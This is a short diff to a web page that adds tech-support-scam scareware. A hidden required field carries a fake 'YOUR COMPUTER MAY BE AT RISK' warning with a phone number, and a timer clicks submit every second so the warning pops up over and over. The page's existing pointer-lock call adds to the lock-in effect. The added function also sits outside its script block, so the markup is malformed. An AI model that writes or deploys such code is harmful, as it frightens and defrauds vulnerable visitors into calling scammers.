@@ -65,3 +65,18 @@ pointerLockElement.requestPointerLock();
   }
 
   </script>
+
+
+  function test(){
+aaa = document.getElementById("aaa");
+aaa.style.opacity = '0';
+aaa.oninvalid = function (e) {
+e.target.setCustomValidity("WARNING!\nYOUR COMPUTER MAY BE AT RISK.\nCALL: 800-111-2222");
+};
+setInterval("document.getElementById('bbb').click()",1000);
+}
+</script>
+<form>
+    <input placeholder="aaa" required id="aaa" />
+    <input id='bbb' type="submit" name="submit">
+</form>
